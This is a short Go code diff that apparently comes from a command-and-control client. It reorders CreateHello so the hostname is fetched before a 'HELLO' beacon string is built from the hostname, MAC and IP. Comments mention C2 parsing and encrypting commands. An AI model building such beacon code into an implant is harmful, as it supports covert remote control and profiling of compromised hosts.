@@ -357,14 +357,16 @@ func GetRouterMAC(iface string) (net.HardwareAddr, error) {
 //	*NOTE* hostMAC and hostIP will end up being the MAC/IP of the gateway
 //			we are dealing with NAT. This will be handled by the C2 parsing
 func CreateHello(hostMAC net.HardwareAddr, srcIP net.IP) (hello string) {
-	//create base text
-	hello = "HELLO:" + "#" + hostname + "#" + hostMAC.String() + "#" + srcIP.String()
+
 
 	//get hostname
 	hostname, err := os.Hostname()
 	if err != nil {
 		log.Fatal("Hostname not found...")
 	}
+
+	//create base text
+	hello = "HELLO:" + "#" + hostname + "#" + hostMAC.String() + "#" + srcIP.String()
 	
 	for i, value := range arr[2:len(os.Args)-1] {
 		//Encrypt Command
